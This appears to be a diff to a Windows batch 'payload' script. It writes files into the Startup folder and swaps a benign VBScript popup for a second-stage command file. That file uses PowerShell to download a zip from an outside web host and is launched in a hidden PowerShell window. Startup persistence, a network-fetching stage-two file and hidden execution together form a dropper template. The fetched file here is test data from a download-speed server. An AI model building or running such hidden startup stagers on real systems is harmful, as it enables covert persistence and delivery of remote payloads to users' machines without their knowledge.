@@ -11,11 +11,11 @@ cd "%STARTUP%"
 
 @REM write payloads
 (
-    echo MsgBox "Line 1" ^& vbCrLf ^& "Line 2",262192, "Title"
-)> popup.vbs
+    echo powershell -c "Invoke-WebRequest -Uri 'http://ipv4.download.thinkbroadband.com/10MB.zip' -OutFile 'test.zip'"
+)> stage2.cmd
 
 @REM run payload
-start popup.vbs
+powershell Start-Process powershell.exe -windowstyle hidden "%STARTUP%/stage2.cmd"
 
 @REM cd back to original directory
 cd "%VAR%"
